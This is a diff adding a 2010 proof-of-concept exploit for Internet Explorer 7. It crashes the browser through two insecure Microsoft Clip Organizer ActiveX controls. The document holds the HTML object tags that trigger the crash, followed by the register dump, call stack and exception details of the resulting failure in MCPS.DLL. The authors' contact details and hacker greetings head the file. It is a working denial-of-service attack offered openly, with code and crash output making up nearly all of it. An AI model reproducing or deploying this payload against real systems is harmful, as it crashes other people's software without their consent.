@@ -1,0 +1,114 @@
+# IE 7.0 - DoS Microsoft Clip Organizer Multiple Insecure ActiveX Control
+#
+# Date: 19th july 2010
+#
+# Author: Dinesh Arora & Beenu Arora
+#
+#
+# Affected / Tested Version of IE : 7.0 / WinXP SP3 / MS Office 2007
+#
+# contact: dinesh.dinoo@gmail.com, beenudel1986@gmail.com
+# 
+# Greetz to :b0nd, Fbih2s,r45c4l,Charles ,j4ckh4x0r, punter,eberly
+#
+# Shoutz to : http://www.garage4hackers.com , www.beenuarora.com
+
+POC:
+
+		<!--
+		COM Object - {0009608B-3E4E-4BF4-8C8C-D107F1F7B4CE} MC Euro Lexical Analyzer
+		*******************************************************************************
+		COM Object Filename : C:\PROGRA~1\MICROS~2\Office12\MCPS.DLL
+		Major Version       : 12
+		Minor Version       : 0
+		Build Number        : 4518
+		Revision Number     : 1014
+		Product Version     : 12.0.4518.1014
+		Product Name        : Microsoft Clip Organizer
+		-->
+		<object id=TestObj classid="CLSID:{0009608B-3E4E-4BF4-8C8C-D107F1F7B4CE}" style="width:100;height:350"></object>
+
+
+
+		<!--
+		COM Object - {0051FAAD-74C8-4057-8A85-1CFBF9ABB05C} MC Shared Search Scope
+		*******************************************************************************
+		COM Object Filename : C:\PROGRA~1\MICROS~2\Office12\MCPS.DLL
+		Major Version       : 12
+		Minor Version       : 0
+		Build Number        : 4518
+		Revision Number     : 1014
+		Product Version     : 12.0.4518.1014
+		Product Name        : Microsoft Clip Organizer
+		*******************************************************************************
+		-->
+		<object id=TestObj classid="CLSID:{0051FAAD-74C8-4057-8A85-1CFBF9ABB05C}" style="width:100;height:350"></object>
+
+
+Register:
+
+EAX 02299BC4
+ECX 00000000
+EDX 00000000
+EBX 00000000
+ESP 02299BC0
+EBP 02299C14
+ESI 02299C8C
+EDI 00000000
+EIP 7C812AFB kernel32.7C812AFB
+
+
+
+kernel32!RaiseException+53 in C:\WINDOWS\system32\kernel32.dll from Microsoft Corporation has caused an unknown exception (0xc06d007e) on thread 33
+
+This exception originated from MCPS!DllGetClassObject+6db1. 
+
+
+Function     			Arg 1     Arg 2     Arg 3   Source 
+kernel32!RaiseException+53     c06d007e     00000000     00000001    
+MCPS!DllGetClassObject+6db1     00000000     06029c38     39f34f4c    
+MCPS!DllGetClassObject+5c6d     39f2a3bc     39f221b4     39f34360    
+MCPS!DllCanUnloadNow+2b6b     00205cf0     0602a688     06029d64    
+ole32!CClassCache::CDllPathEntry::DllGetClassObject+2d     00205cf0     0602a688     06029d64    
+ole32!CClassCache::CDllFnPtrMoniker::BindToObjectNoSwitch+1f     06029d18     0602a688     06029d64    
+ole32!CClassCache::GetClassObject+38     06029d6c     0602a83c     0602a300    
+ole32!CServerContextActivator::GetClassObject+f5     77607150     0602a300     0602a83c    
+ole32!ActivationPropertiesIn::DelegateGetClassObject+f3     0602a300     0602a83c     0602a300    
+ole32!CApartmentActivator::GetClassObject+4d     77607154     0602a300     0602a83c    
+ole32!CProcessActivator::GCOCallback+2b     77607154     00000001     00000000    
+ole32!CProcessActivator::AttemptActivation+2c     7760714c     0602a15c     00000000    
+ole32!CProcessActivator::ActivateByContext+42     7760714c     0602a15c     00000000    
+ole32!CProcessActivator::GetClassObject+48     7760714c     0602a300     0602a83c    
+ole32!ActivationPropertiesIn::DelegateGetClassObject+f3     0602a300     0602a83c     003a0043    
+ole32!CClientContextActivator::GetClassObject+88     77607114     00000001     0602a83c    
+ole32!ActivationPropertiesIn::DelegateGetClassObject+f3     0602a300     0602a83c     774eca20    
+ole32!ICoGetClassObject+334     0602a9dc     00000007     00000000    
+ole32!CComActivator::DoGetClassObject+93     0602a9dc     00000007     00000000    
+ole32!CoGetClassObject+1b     0602a9dc     00000007     00000000    
+urlmon!CoGetClassObjectWrap+33     0602a9dc     00000007     00000000    
+urlmon!CoGetClassObjectFromURL+2ae     056f8fd0     00000000     00000000    
+mshtml!CCodeLoad::BindToObject+464     3cf5193c     0602bc00     00000000    
+mshtml!CCodeLoad::Init+296     0576d538     0602bc00     3cf8d43c    
+mshtml!COleSite::CreateObject+5a5     0602bc00     05720bf8     05976520    
+mshtml!CObjectElement::CreateObject+6af     3cee8243     0573a860     00000000    
+mshtml!CHtmObjectParseCtx::Execute+8     0573a860     00000000     00000000    
+mshtml!CHtmParse::Execute+43     05720bf8     00000000     0573a860    
+mshtml!CHtmPost::Broadcast+11     3cedb43d     0577ca50     0573a860    
+mshtml!CHtmPost::Exec+40a     24a63821     0577ca50     0573a860    
+mshtml!CHtmPost::Run+13     24a63821     0577ca50     0573a860    
+mshtml!PostManExecute+dc     0577ca50     24a63821     0573a860    
+mshtml!PostManResume+9e     0573a860     00000001     0602fdf4    
+mshtml!CHtmPost::OnDwnChanCallback+10     05952930     0573a860     0602fe28    
+mshtml!CDwnChan::OnMethodCall+19     05952930     00000000     00000000    
+mshtml!GlobalWndOnMethodCall+101     0602feb0     3cf513d9     00000000    
+mshtml!GlobalWndProc+181     005707a2     00000009     00000000    
+user32!InternalCallWinProc+28     3cf513d9     005707a2     00008002    
+user32!UserCallWinProcCheckWow+150     00000000     3cf513d9     005707a2    
+user32!DispatchMessageWorker+306     0602ff64     00000000     0602ffb4    
+user32!DispatchMessageW+f     0602ff64     053400b8     000001c1    
+ieframe!CTabWindow::_TabWindowThreadProc+189     056adac8     053400b8     000001c1    
+kernel32!BaseThreadStart+37     3e25e4fc     056a5cf8     00000000    
+
+
+The assembly instruction at kernel32!RaiseException+53 in C:\WINDOWS\system32\kernel32.dll from Microsoft Corporation has caused an unknown exception (0xc06d007e) on thread 33
+This exception originated from MCPS!DllGetClassObject+6db1. 
